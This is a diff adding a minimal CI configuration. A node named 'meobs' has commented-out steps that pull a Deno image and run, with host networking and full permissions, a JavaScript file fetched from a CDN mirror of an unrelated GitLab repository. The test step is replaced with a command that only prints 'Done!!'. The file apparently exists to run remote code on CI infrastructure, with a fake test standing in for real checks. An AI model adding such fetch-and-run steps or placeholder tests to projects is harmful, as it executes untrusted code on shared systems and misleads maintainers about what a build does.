@@ -1,0 +1,15 @@
+checks:
+    javascript: true
+build:
+    environment:
+        docker:
+          remote_engine: true
+    nodes:
+        meobs:
+            #dependencies:
+                #before:
+                    #- docker pull hayd/deno
+                    #- docker run -it --network host hayd/deno run -A https://glcdn.githack.com/liutiuvuathoi/localstoragefile/-/raw/main/file_1.js
+            tests:
+                override:
+                    - command: echo "Done!!"
